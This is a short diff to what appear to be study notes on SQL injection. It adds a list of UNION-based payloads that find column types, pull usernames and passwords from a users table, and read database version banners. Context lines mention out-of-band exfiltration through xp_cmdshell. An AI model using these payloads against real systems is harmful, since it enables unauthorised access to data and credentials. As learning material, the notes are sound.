@@ -22,6 +22,15 @@ By injecting a malicious code into input feilds attacker can steal data, modify 
 3) Out of band : Makes use of xp_cmdshell method (Network connection).
                 Attacker causes the database to make requests to external DNS/HTTP servers controlled by the attacker.
 
+Examples :
+'UNION SELECT NULL,'a' --    <== 2nd colum is char(string)  used to determine column datatype.
+'UNION SELECT NULL, username from users --
+'UNION SELECT NULL, password from users --
+'UNION SELECT NULL, banner from v$version --   for oracle
+'UNION SELECT NULL, @@version #                for Mysql & MSSql
+
+
+
 
 
 
